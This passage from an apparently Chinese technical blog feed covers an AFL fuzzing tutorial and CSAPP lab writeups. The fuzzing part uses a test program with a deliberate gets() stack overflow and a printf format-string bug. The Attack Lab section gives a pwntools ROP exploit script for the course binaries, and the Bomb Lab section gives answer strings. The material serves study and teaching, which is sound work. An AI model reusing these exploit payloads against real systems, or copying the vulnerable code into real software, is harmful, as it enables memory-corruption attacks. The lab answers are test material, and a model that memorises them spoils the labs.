raise(SIGSEGV);</span><br><span class="line">        <span class="comment">//如果输入的字符串的首字符为F并且长度为6，则异常退出</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;it is good!\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> *argv[])</span> </span>&#123;</span><br><span class="line">    <span class="keyword">char</span> buf[<span class="number">20</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    </span><br><span class="line">    gets(buf);<span class="comment">//存在栈溢出漏洞</span></span><br><span class="line">    <span class="built_in">printf</span>(buf);<span class="comment">//存在格式化字符串漏洞</span></span><br><span class="line">    vuln(buf);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">$ mkdir fuzz_test; <span class="built_in">cd</span> fuzz_test </span><br><span class="line">$ mkdir fuzz_in fuzz_out</span><br><span class="line">$ afl-gcc -g -o afl_test afl_test.c //插桩编译</span><br><span class="line">$ sudo su</span><br><span class="line">$ <span class="built_in">echo</span> core &gt;/proc/sys/kernel/core_pattern</span><br><span class="line">$ <span class="built_in">exit</span></span><br><span class="line">$ afl-fuzz -i fuzz_in -o fuzz_out ./afl_test</span><br></pre></td></tr></table></figure><blockquote><p>ps：随便在 fuzz_in 放一些种子文件即可。</p><p>命令解析：</p><ul><li><p><code>-i</code>：指定测试样本的路径</p></li><li><p><code>-o</code>：指定输出结果的路径</p></li><li><p>更详细见：<code>$ afl-fuzz -h</code></p></li><li><p><code>echo core &gt;/proc/sys/kernel/core_pattern</code></p><p>  在执行<code>afl-fuzz</code>前，如果系统配置为将核心转储文件（core）通知发送到外部程序。 将导致将崩溃信息发送到Fuzzer之间的延迟增大，进而可能将崩溃被误报为超时，所以我们得临时修改<code>core_pattern</code>文件</p></li></ul></blockquote><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/blog/20200803145522.png"></p><h2 id="窗口解读"><a href="#窗口解读" class="headerlink" title="窗口解读"></a>窗口解读</h2><ul><li><p>Process timing:Fuzzer运行时长、以及距离最近发现的路径、崩溃和挂起经过了多长时间。</p></li><li><p>Overall results：Fuzzer当前状态的概述。</p></li><li><p>Cycle progress：我们输入队列的距离。</p></li><li><p>Map coverage：目标二进制文件中的插桩代码所观察到覆盖范围的细节。</p></li><li><p>Stage progress：Fuzzer现在正在执行的文件变异策略、执行次数和执行速度。</p></li><li><p>Findings in depth：有关我们找到的执行路径，异常和挂起数量的信息。</p></li><li><p>Fuzzing strategy yields：关于突变策略产生的最新行为和结果的详细信息。</p></li><li><p>Path geometry：有关Fuzzer找到的执行路径的信息。</p></li><li><p>CPU load：CPU利用率</p></li></ul><h2 id="分析crash"><a href="#分析crash" class="headerlink" title="分析crash"></a>分析crash</h2><p>因为程序本身很简单，跑了几分钟跑出来 4 个<code>crash</code></p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">$ xxd id:000004,sig:06,src:000000,op:havoc,rep:64</span><br><span class="line"></span><br><span class="line">00000000: 4100 7f00 00f1 83ec ff00 7f00 00f1 7fff  A...............</span><br><span class="line">00000010: ffff 0c41 007f 0000 f1a2 ffff ff0b fd5f  ...A..........._</span><br><span class="line">00000020: 8000 0000 fe0c 5f6b 2000 ff0c 6200 7f0c  ......_k ...b...</span><br><span class="line">00000030: 5f6b 00f1 7fec ff00 7f00 00f1 7fff ffff  _k..............</span><br><span class="line">00000040: 0c41 007f 0000 f1a2 ffff ff0b fd5f 8000  .A..........._..</span><br><span class="line">00000050: 0000 fe0c 5f6b 2000 ff0c 6200 7f0c 5f6b  ...._k ...b..._k</span><br><span class="line">00000060: 0000 00fe 8108 7f00 0000 00fe 405f 6b00  ............@_k.</span><br><span class="line">00000070: 00ff 0000 f17f ecff 007f 0000 f17f ffff  ................</span><br><span class="line">00000080: ff0c 4100 7f00 00f1 a2ff ffff 0bfd 5f80  ..A..........._.</span><br><span class="line">00000090: 0000 00fe 0c5f 6b20 0000 00fe 7e0c 4100  ....._k ....~.A.</span><br><span class="line">000000a0: 7f00 00f1 7fff ffff 0bec 5f80 0000 00fe  .........._.....</span><br><span class="line">000000b0: 0c5f 6700 0000 fe7e 0800 0000 fe81 087f  ._g....~........</span><br><span class="line">000000c0: 0000 0000 fe40 5f6b 0000 00ff 4100 7f00  .....@_k....A...</span><br><span class="line">000000d0: 00f1 a2ff ffff 0bfd 5f80 0000 00fe 0c5f  ........_......_</span><br><span class="line">000000e0: 6b20 00ff 0c62 007f 0c5f 6b00 0000 fe72  k ...b..._k....r</span><br><span class="line">000000f0: 087f 0000 0000 fe40 5f6b 0000 ff0c 4100  .......@_k....A.</span><br><span class="line">00000100: 7f00 00f1 7fff ffff 0bec 5f80 0000 00fe  .........._.....</span><br><span class="line">00000110: 0c5f 6700 0000 fe7e 0c41 007f 0000 f17f  ._g....~.A......</span><br><span class="line">00000120: ffff ff0b ec5f 8000 0000 fe0c 5f67 0000  ....._......_g..</span><br><span class="line">00000130: 00fe 7e08                                ..~.</span><br></pre></td></tr></table></figure><p>可以看出来是由栈溢出所导致的。</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ xxd id:000002,sig:06,src:000000,op:havoc,rep:128</span><br><span class="line">00000000: 256e                                     %n</span><br></pre></td></tr></table></figure><p>格式化字符串导致。</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">xxd id:000000,sig:11,src:000001,op:havoc,rep:4</span><br><span class="line">00000000: 4672 6497 7364                           Frd.sd</span><br></pre></td></tr></table></figure><p>输入的字符串的首字符为F并且长度为6，则异常退出</p><h2 id="黑盒测试"><a href="#黑盒测试" class="headerlink" title="黑盒测试"></a>黑盒测试</h2><p>黑盒测试要用到AFL的QEMU模式了。</p><p>所以我们需要再额外装一下东西。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">$ <span class="built_in">cd</span> ~</span><br><span class="line">$ sudo apt-get install libini-config-dev libtool-bin automake bison libglib2.0-dev -y</span><br><span class="line">$ <span class="built_in">cd</span> afl-2.52/qemu_mode</span><br><span class="line">$ ./build_qemu_support.sh</span><br><span class="line">$ <span class="built_in">cd</span> .. </span><br><span class="line">$ sudo make install</span><br></pre></td></tr></table></figure><p>我们接着用刚刚的源文件重新编译然后进行新的黑盒 fuzz。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ gcc -g -o afl_test2 afl_test.c</span><br><span class="line">$ afl-fuzz -i fuzz_in -o fuzz_out -Q ./afl_test2</span><br></pre></td></tr></table></figure><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/blog/20200804111331.png" alt="image"></p><h2 id="输出结果"><a href="#输出结果" class="headerlink" title="输出结果"></a>输出结果</h2><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">fuzz_out/</span><br><span class="line">├── crashes</span><br><span class="line">│   ├── id:000000,sig:06,src:000000,op:havoc,rep:32</span><br><span class="line">│   ├── id:000001,sig:06,src:000000,op:havoc,rep:32</span><br><span class="line">│   ├── id:000002,sig:11,src:000001,op:havoc,rep:2</span><br><span class="line">│   ├── id:000003,sig:06,src:000002,op:havoc,rep:16</span><br><span class="line">│   ├── id:000004,sig:11,src:000000,op:havoc,rep:128</span><br><span class="line">│   ├── id:000005,sig:11,src:000002,op:havoc,rep:16</span><br><span class="line">│   └── README.txt</span><br><span class="line">├── fuzz_bitmap</span><br><span class="line">├── fuzzer_stats</span><br><span class="line">├── hangs</span><br><span class="line">├── plot_data</span><br><span class="line">└── queue</span><br><span class="line">    ├── id:000000,orig:test</span><br><span class="line">    ├── id:000001,src:000000,op:arith8,pos:0,val:-30,+cov</span><br><span class="line">    └── id:000002,src:000000,op:arith8,pos:0,val:-35,+cov</span><br><span class="line"></span><br><span class="line">3 directories, 13 files</span><br></pre></td></tr></table></figure><p><code>queue</code>：存放所有具有独特执行路径的测试用例。<br><code>crashes</code>：导致目标接收致命<code>signal</code>而崩溃的独特测试用例。<br><code>crashes/README.txt</code>：保存了目标执行这些<code>crash</code>文件的命令行参数。<br><code>hangs</code>：导致目标超时的独特测试用例。<br><code>fuzzer_stats</code>：<code>afl-fuzz</code>的运行状态。<br><code>plot_data</code>：用于<code>afl-plot</code>绘图。</p><h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p><a href="https://zh.wikipedia.org/wiki/%E6%A8%A1%E7%B3%8A%E6%B5%8B%E8%AF%95">https://zh.wikipedia.org/wiki/%E6%A8%A1%E7%B3%8A%E6%B5%8B%E8%AF%95</a></p><p><a href="https://www.f-secure.com/en/consulting/our-thinking/15-minute-guide-to-fuzzing">https://www.f-secure.com/en/consulting/our-thinking/15-minute-guide-to-fuzzing</a></p><p><a href="https://foxglovesecurity.com/2016/03/15/fuzzing-workflows-a-fuzz-job-from-start-to-finish/">https://foxglovesecurity.com/2016/03/15/fuzzing-workflows-a-fuzz-job-from-start-to-finish/</a></p><p><a href="https://paper.seebug.org/841/#2_3">https://paper.seebug.org/841/#2_3</a></p><p><a href="https://paper.seebug.org/842/#_1">https://paper.seebug.org/842/#_1</a></p><p><a href="https://xz.aliyun.com/t/4314#toc-8">https://xz.aliyun.com/t/4314#toc-8</a></p>]]></content>
      
      
      <categories>
          
          <category> Notes </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Fuzz </tag>
            
            <tag> 环境搭建 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CSAPP Lab</title>
      <link href="posts/ab6e7b0/"/>
      <url>posts/ab6e7b0/</url>
      
        <content type="html"><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>记录一下 css app lab，<a href="http://csapp.cs.cmu.edu/3e/labs.html">下载地址</a></p><p>代码放在了 <a href="https://github.com/focu5/CSAPP-Labs">Github</a></p><h3 id="Data-Lab"><a href="#Data-Lab" class="headerlink" title="Data Lab"></a>Data Lab</h3><h4 id="bitXor"><a href="#bitXor" class="headerlink" title="bitXor"></a>bitXor</h4><p><code>x ^ y = (~x &amp; y) | (x &amp; ~y) </code></p><p>题目限制我们仅使用 <code>&amp; ～</code>，所以我们想办法代替 <code>｜</code> 即可。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">bitXor</span><span class="params">(<span class="keyword">int</span> x, <span class="keyword">int</span> y)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> ~(~(~x &amp; y) &amp; (~(x &amp; ~y)));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="tmin"><a href="#tmin" class="headerlink" title="tmin"></a>tmin</h4><p>以补码形式返回最小的整数。即：符号为是1，其余均为0。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">tmin</span><span class="params">(<span class="keyword">void</span>)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0x1</span>&lt;&lt;<span class="number">31</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="isTmax"><a href="#isTmax" class="headerlink" title="isTmax"></a>isTmax</h4><p>如果是最大的整数则返回1.</p><p>注意三个比较讨厌的数：</p><blockquote><p>0x7fffffff：01111111111111111111111111111111<br>0xffffffff：11111111111111111111111111111111<br>0x80000000：10000000000000000000000000000000</p></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">isTmax</span><span class="params">(<span class="keyword">int</span> x)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> !((~x^(x+<span class="number">1</span>)) | !(x+<span class="number">1</span>));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="allOddBits"><a href="#allOddBits" class="headerlink" title="allOddBits"></a>allOddBits</h4><p>判断所有奇数位是否都为1.</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">allOddBits</span><span class="params">(<span class="keyword">int</span> x)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">int</span> y = <span class="number">0xaa</span> + (<span class="number">0xaa</span>&lt;&lt;<span class="number">8</span>);</span><br><span class="line">  y = y+ (y &lt;&lt; <span class="number">16</span>);</span><br><span class="line">  <span class="keyword">return</span> !((y &amp; x) ^ y);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>思路：可以先自行构造出一个所有奇数位都为1的标准数，在进行比较。</p><h4 id="negate"><a href="#negate" class="headerlink" title="negate"></a>negate</h4><p>返回相反数，常识题。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">negate</span><span class="params">(<span class="keyword">int</span> x)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> ~x+<span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="isAsciiDigit"><a href="#isAsciiDigit" class="headerlink" title="isAsciiDigit"></a>isAsciiDigit</h4><p>计算输入值是否是数字 0-9 的 <code>ASCII</code> 值。</p><p>思路：先观察0x30-0x39的二进制数有什么特点，发现0x30-0x3f之间的第4、5位均为1。假设 x 是 0 - 9 之间的一个数，！(x &lt;&lt; 4 ^ 0x3) = 1，y = x + 0x6， ！(y &lt;&lt; 4 ^ 0x3) = 1，确保这两个同时成立即可判断。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">isAsciiDigit</span><span class="params">(<span class="keyword">int</span> x)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">int</span> y = x &gt;&gt; <span class="number">4</span>;</span><br><span class="line">  x = x + <span class="number">0x6</span>;</span><br><span class="line">  <span class="keyword">int</span> z = x &gt;&gt; <span class="number">4</span>;</span><br><span class="line">  <span class="keyword">return</span> !(y ^ <span class="number">0x3</span>) &amp; !(z ^ <span class="number">0x3</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="conditional"><a href="#conditional" class="headerlink" title="conditional"></a>conditional</h4><p>执行运算符 x ? y : z：当 x 不为 0 时，返回 y；否则返回 z。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">conditional</span><span class="params">(<span class="keyword">int</span> x, <span class="keyword">int</span> y, <span class="keyword">int</span> z)</span> </span>&#123;</span><br><span class="line">  x = !x + ~<span class="number">0</span>;</span><br><span class="line">  <span class="keyword">return</span> (y &amp; x) | (z &amp; ~x);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="isLessOrEqual"><a href="#isLessOrEqual" class="headerlink" title="isLessOrEqual"></a>isLessOrEqual</h4><p>判断 x &lt;= y</p><p><a href="https://zhuanlan.zhihu.com/p/59534845">参考</a></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">isLessOrEqual</span><span class="params">(<span class="keyword">int</span> x, <span class="keyword">int</span> y)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">int</span> negX=~x+<span class="number">1</span>;</span><br><span class="line">  <span class="keyword">int</span> addX=negX+y;</span><br><span class="line">  <span class="keyword">int</span> checkSign = addX&gt;&gt;<span class="number">31</span>&amp;<span class="number">1</span>;</span><br><span class="line">  <span class="keyword">int</span> leftBit = <span class="number">1</span>&lt;&lt;<span class="number">31</span>;</span><br><span class="line">  <span class="keyword">int</span> xLeft = x&amp;leftBit;</span><br><span class="line">  <span class="keyword">int</span> yLeft = y&amp;leftBit;</span><br><span class="line">  <span class="keyword">int</span> bitXor = xLeft ^ yLeft;</span><br><span class="line">  bitXor = (bitXor&gt;&gt;<span class="number">31</span>)&amp;<span class="number">1</span>;</span><br><span class="line">  <span class="keyword">return</span> ((!bitXor)&amp;(!checkSign))|(bitXor&amp;(xLeft&gt;&gt;<span class="number">31</span>));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="logicalNeg"><a href="#logicalNeg" class="headerlink" title="logicalNeg"></a>logicalNeg</h4><p>实现<code> ！</code>运算</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">logicalNeg</span><span class="params">(<span class="keyword">int</span> x)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> ((x|(~x+<span class="number">1</span>))&gt;&gt;<span class="number">31</span>)+<span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="howManyBits"><a href="#howManyBits" class="headerlink" title="howManyBits"></a>howManyBits</h4><p>用二分法来判断。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">howManyBits</span><span class="params">(<span class="keyword">int</span> x)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">int</span> b16,b8,b4,b2,b1,b0;</span><br><span class="line">  <span class="keyword">int</span> sign=x&gt;&gt;<span class="number">31</span>;</span><br><span class="line">  x = (sign&amp;~x)|(~sign&amp;x);</span><br><span class="line">  b16 = !!(x&gt;&gt;<span class="number">16</span>)&lt;&lt;<span class="number">4</span>;</span><br><span class="line">  x = x&gt;&gt;b16;<span class="comment">//如果有（至少需要16位），则将原数右移16位</span></span><br><span class="line">  b8 = !!(x&gt;&gt;<span class="number">8</span>)&lt;&lt;<span class="number">3</span>;<span class="comment">//剩余位高8位是否有1</span></span><br><span class="line">  x = x&gt;&gt;b8;<span class="comment">//如果有（至少需要16+8=24位），则右移8位</span></span><br><span class="line">  b4 = !!(x&gt;&gt;<span class="number">4</span>)&lt;&lt;<span class="number">2</span>;<span class="comment">//同理</span></span><br><span class="line">  x = x&gt;&gt;b4;</span><br><span class="line">  b2 = !!(x&gt;&gt;<span class="number">2</span>)&lt;&lt;<span class="number">1</span>;</span><br><span class="line">  x = x&gt;&gt;b2;</span><br><span class="line">  b1 = !!(x&gt;&gt;<span class="number">1</span>);</span><br><span class="line">  x = x&gt;&gt;b1;</span><br><span class="line">  b0 = x;</span><br><span class="line">  <span class="keyword">return</span> b16+b8+b4+b2+b1+b0+<span class="number">1</span>;<span class="comment">//+1表示加上符号位</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="Bomb-Lab"><a href="#Bomb-Lab" class="headerlink" title="Bomb Lab"></a>Bomb Lab</h3><p>其实有re、pwn基础，拆解还不算很困难。（还可以结合<code>ida</code>分析，不过个人感觉怼汇编理解会更好一些.</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&quot;debug&quot;</span></span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&quot;./bomb&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">db</span>():</span></span><br><span class="line">gdb.attach(p)</span><br><span class="line"><span class="comment">#phase_1</span></span><br><span class="line">p.sendline(<span class="string">&quot;Border relations with Canada have never been better.&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#phase_2</span></span><br><span class="line">p.sendline(<span class="string">&quot;1 2 4 8 16 32&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#phase_3</span></span><br><span class="line">p.sendline(<span class="string">&quot;1 311&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#phase_3</span></span><br><span class="line">p.sendline(<span class="string">&quot;7 0&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#phase_4</span></span><br><span class="line">p.sendline(<span class="string">&quot;YONUFG&quot;</span>)</span><br><span class="line"><span class="comment">#db()</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#phase_5</span></span><br><span class="line">p.sendline(<span class="string">&quot;4 3 2 1 6 5&quot;</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h3 id="Attack-Lab"><a href="#Attack-Lab" class="headerlink" title="Attack Lab"></a>Attack Lab</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line">context.log_level = <span class="string">&quot;debug&quot;</span></span><br><span class="line"></span><br><span class="line">argv1 = sys.argv[<span class="number">1</span>]</span><br><span class="line">argv2 = sys.argv[<span class="number">2</span>]</span><br><span class="line"><span class="keyword">if</span> argv1 == <span class="string">&quot;part1&quot;</span> :</span><br><span class="line">p = process(argv=[<span class="string">&#x27;./ctarget&#x27;</span>, <span class="string">&quot;-q&quot;</span>])</span><br><span class="line"><span class="keyword">elif</span> argv1 == <span class="string">&quot;part2&quot;</span>:</span><br><span class="line">p = process(argv=[<span class="string">&#x27;./rtarget&#x27;</span>, <span class="string">&quot;-q&quot;</span>])</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">db</span>():</span></span><br><span class="line">gdb.attach(p)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">pwn1</span>():</span></span><br><span class="line"><span class="comment">#ROPgadget --binary ctarget --only &quot;pop|ret&quot;</span></span><br><span class="line">rdi_ret = <span class="number">0x000000000040141b</span></span><br><span class="line"><span class="keyword">if</span> argv2 == <span class="string">&quot;level_1&quot;</span>:</span><br><span class="line">p.sendline(<span class="string">&quot;a&quot;</span>*<span class="number">0x28</span>+p64(<span class="number">0x4017c0</span>))</span><br><span class="line"></span><br><span class="line"><span class="keyword">elif</span> argv2 == <span class="string">&quot;level_2&quot;</span>:</span><br><span class="line">rdi_ret = <span class="number">0x40141b</span></span><br><span class="line">payload = <span class="string">&quot;a&quot;</span> *<span class="number">0x28</span> + p64(rdi_ret) + p64(<span class="number">0x59b997fa</span>) + p64(<span class="number">0x4017ec</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line"><span class="keyword">elif</span> argv2 == <span class="string">&quot;level_3&quot;</span>:</span><br><span class="line">payload = <span class="string">&quot;a&quot;</span> *<span class="number">0x28</span> + p64(rdi_ret) + p64(<span class="number">0x5561dcb8</span>) + p64(<span class="number">0x4018fa</span>) + <span class="string">&quot;0x59b997fa&quot;</span></span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">pwn2</span>():</span></span><br><span class="line"><span class="comment">#ROPgadget --binary rtarget --only &quot;pop|ret&quot;</span></span><br><span class="line">rdi_ret = <span class="number">0x000000000040141b</span></span><br><span class="line"><span class="keyword">if</span> argv2 == <span class="string">&quot;level_2&quot;</span>:</span><br><span class="line">payload = <span class="string">&quot;a&quot;</span> *<span class="number">0x28</span> + p64(rdi_ret) + p64(<span class="number">0x59b997fa</span>) + p64(<span class="number">0x4017ec</span>) </span><br><span class="line">p.sendline(payload)</span><br><span class="line"><span class="keyword">elif</span> argv2 == <span class="string">&quot;level_3&quot;</span>:</span><br><span class="line">read_plt = <span class="number">0x400D30</span></span><br><span class="line">main_addr = <span class="number">0x4011AD</span></span><br><span class="line">payload = <span class="string">&quot;a&quot;</span> * <span class="number">0x28</span> + p64(rdi_ret) + p64(<span class="number">0x6054E4</span>) + p64(<span class="number">0x4018fa</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> argv1 == <span class="string">&quot;part1&quot;</span>:</span><br><span class="line">pwn1()</span><br><span class="line"><span class="keyword">elif</span> argv1 == <span class="string">&quot;part2&quot;</span>:</span><br><span class="line">pwn2()</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h3 id="Arch-Lab"><a href="#Arch-Lab" class="headerlink" title="Arch Lab"></a>Arch Lab</h3><blockquote><p>$ sudo apt-get install bison flex</p><p>$ cd Arch_lab</p><p>$ tar xvf  sim.tar</p><p>$ cd sim; make clean; make</p></blockquote><h4 id="Part-A"><a href="#Part-A" class="headerlink" title="Part A"></a>Part A</h4><p>根据<code>examples.c</code>给的三个函数，写出对应的<code>y86-64</code> 汇编代码。</p><blockquote><p>csapp p252 给了示例代码，模仿即可。</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span 